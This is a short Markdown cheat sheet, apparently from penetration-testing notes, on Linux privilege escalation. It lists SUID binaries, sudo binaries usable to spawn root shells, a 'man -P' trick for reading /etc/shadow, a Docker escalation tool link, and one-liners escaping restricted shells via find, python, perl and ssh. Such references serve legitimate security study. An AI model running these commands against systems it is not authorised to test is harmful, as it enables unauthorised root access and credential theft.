### [See Linux Enumeration](../../Enumeration/FromTarget/Linux/README.md)

### SUID Binaries
##### Known SUID Binaries
```bash
/bin/ping
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
```

### SUDO
##### Common Sudo Binaries to Establish root Shells
```bash
less (!sh)
more (!sh)
Vi/Vim (:!sh)
nmap (--interactive + !sh)
ftp (!sh)
gdb (!sh)
python
Perl
lrb
lua
```
##### Common Sudo Binaries to Execute Commands
```bash
man -P "id" man
man -P "cat /etc/shadow" man
```
##### Docker
[dockerevil](https://github.com/pyperanger/dockerevil)

### Restricted Shells
##### Escape with Vi/Vim
```bash
Vi/Vim (:!sh)
```
##### Escape with Find
```bash
find /home/<Username> -name <Exisiting Filename> -exec /bin/sh \;
# If file exists, it executes the command.
```
##### Escape with Python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
##### Escape with Perl
```bash
perl -e 'exec "/bin/sh";'
```
##### Escape with SSH
```bash
ssh <Restricted Username>@<Target> -t "/bin/sh"
```

# References
[Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)